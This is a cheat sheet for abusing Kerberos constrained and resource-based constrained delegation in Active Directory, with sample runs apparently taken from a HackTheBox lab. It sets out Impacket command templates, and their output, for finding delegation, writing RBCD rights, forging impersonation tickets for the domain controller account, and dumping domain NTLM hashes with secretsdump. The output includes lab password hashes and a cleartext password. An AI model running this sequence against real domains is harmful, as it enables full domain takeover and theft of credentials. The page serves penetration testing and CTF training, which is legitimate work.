---
title: "Constrained Delegation"
date: 2025-7-18
tags: ["Credential Dumping", "Impacket", "Pass-The-Ticket", "Silver Ticket", "Ticket Granting Ticket", "Constrained Delegation", "Active Directory", "Windows", "RBCD", "KCD"]
---

{{< tab set1 tab1 >}}Linux{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Find Delegation

```console
# Password
sudo ntpdate -s <DC_IP> && impacket-findDelegation '<DOMAIN>/<USER>:<PASSWORD>' -k -no-pass -dc-ip <DC>
```

```console
# NTLM
sudo ntpdate -s <DC_IP> && impacket-findDelegation '<DOMAIN>/<USER>' -hashes :<HASH> -k -no-pass -dc-ip <DC>
```

```console {class="sample-code"}
$ sudo ntpdate -s dc01.rebound.htb && impacket-findDelegation 'rebound.htb/delegator$' -dc-ip dc01.rebound.htb -hashes :f7f7ea94cd22bd4129ca00bab335ceb9 -k -no-pass
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[*] Getting machine hostname
[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
[*] Getting machine hostname
AccountName  AccountType                          DelegationType  DelegationRightsTo     SPN Exists 
-----------  -----------------------------------  --------------  ---------------------  ----------
delegator$   ms-DS-Group-Managed-Service-Account  Constrained     http/dc01.rebound.htb  No
```

#### 2. RBCD

```console
# Password
sudo ntpdate -s <DC_IP> && impacket-rbcd '<DOMAIN>/<USER>:<PASSWORD>' -k -delegate-from '<TARGET_1>' -delegate-to '<USER>' -action write -dc-ip <DC> -use-ldaps
```

```console
# NTLM
sudo ntpdate -s <DC_IP> && impacket-rbcd '<DOMAIN>/<USER>' -hashes :<HASH> -k -delegate-from '<TARGET_1>' -delegate-to '<USER>' -action write -dc-ip <DC> -use-ldaps
```

```console {class="sample-code"}
$ sudo ntpdate -s dc01.rebound.htb && impacket-rbcd 'rebound.htb/delegator$' -hashes :f7f7ea94cd22bd4129ca00bab335ceb9 -k -delegate-from 'ldap_monitor' -delegate-to 'delegator$' -action write -dc-ip dc01.rebound.htb -use-ldaps
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] ldap_monitor can now impersonate users on delegator$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     ldap_monitor   (S-1-5-21-4078382237-1492182817-2568127209-7681)
```

#### 3. Check

```console
# Password
sudo ntpdate -s <DC_IP> && impacket-findDelegation '<DOMAIN>/<USER>:<PASSWORD>' -k -no-pass -dc-ip <DC>
```

```console
# NTLM
sudo ntpdate -s <DC_IP> && impacket-findDelegation '<DOMAIN>/<USER>' -hashes :<HASH> -k -no-pass -dc-ip <DC>
```

```console {class="sample-code"}
$ sudo ntpdate -s dc01.rebound.htb && impacket-findDelegation 'rebound.htb/delegator$' -dc-ip dc01.rebound.htb -hashes :f7f7ea94cd22bd4129ca00bab335ceb9 -k -no-pass                        
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[*] Getting machine hostname
[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
AccountName   AccountType                          DelegationType              DelegationRightsTo    
------------  -----------------------------------  --------------------------  ---------------------
ldap_monitor  Person                               Resource-Based Constrained  delegator$            
delegator$    ms-DS-Group-Managed-Service-Account  Constrained                 http/dc01.rebound.htb
```

#### 4. Get a Service Ticket of Target User

```console
# Password
impacket-getST '<DOMAIN>/<TARGET_1>:<TARGET_1_PASSWORD>' -spn <SERVICE_1>/<TARGET_DOMAIN> -impersonate '<TARGET_2>'
```

```console {class="sample-code"}
$ impacket-getST 'rebound.htb/ldap_monitor:1GR8t@$$4u' -spn browser/dc01.rebound.htb -impersonate 'DC01$'
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating DC01$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache
```

#### 5. Check

```console
# Check forwardable flag
describeTicket.py <TICKET_1>.ccache
```

```console {class="sample-code"}
$ impacket-describeTicket 'DC01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache'                                                                              
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[*] Number of credentials in cache: 1
[*] Parsing credential[0]:
[*] Ticket Session Key            : a1633e3d4f841386c7845309a671bcbb
[*] User Name                     : DC01$
[*] User Realm                    : rebound.htb
[*] Service Name                  : browser/dc01.rebound.htb
[*] Service Realm                 : REBOUND.HTB
[*] Start Time                    : 23/09/2024 04:58:00 AM
[*] End Time                      : 23/09/2024 14:57:58 PM
[*] RenewTill                     : 24/09/2024 04:57:56 AM
[*] Flags                         : (0x40a10000) forwardable, renewable, pre_authent, enc_pa_rep
[*] KeyType                       : rc4_hmac
[*] Base64(key)                   : oWM+PU+EE4bHhFMJpnG8uw==
[*] Kerberoast hash               : $krb5tgs$18$USER$REBOUND.HTB$*browser/dc01.rebound.htb*$33332d861 ---[SNIP]--- 27870efddc
[*] Decoding unencrypted data in credential[0]['ticket']:
[*]   Service Name                : browser/dc01.rebound.htb
[*]   Service Realm               : REBOUND.HTB
[*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
```

#### 6. Impersonate

```console
# NTLM
impacket-getST -spn <SERVICE_2>/<TARGET_DOMAIN> -impersonate <TARGET_2> '<DOMAIN>/<USER>' -hashes :<HASH> -additional-ticket <TICKET_1>.ccache
```

```console {class="sample-code"}
$ impacket-getST -spn http/dc01.rebound.htb -impersonate DC01$ 'rebound.htb/delegator$' -hashes :f7f7ea94cd22bd4129ca00bab335ceb9 -additional-ticket DC01\$@browser_dc01.rebound.htb@REBOUND.HTB.ccache 
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating DC01$
[*]     Using additional ticket DC01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache instead of S4U2Self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC01$@http_dc01.rebound.htb@REBOUND.HTB.ccache
```

#### 7. Secrets Dump

```console
export KRB5CCNAME='<TICKET_2>.ccache'
```

```console {class="sample-code"}
$ export KRB5CCNAME='DC01$@http_dc01.rebound.htb@REBOUND.HTB.ccache'
```

```console
impacket-secretsdump -no-pass -k <DC> -just-dc-ntlm
```

```console {class="sample-code"}
$ impacket-secretsdump -no-pass -k dc01.rebound.htb -just-dc-ntlm              
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:176be138594933bb67db3b2572fc91b8:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1108b27a9ff61ed4139d1443fbcf664b:::
---[SNIP]---
[*] Cleaning up..
```

{{< /tabcontent >}}
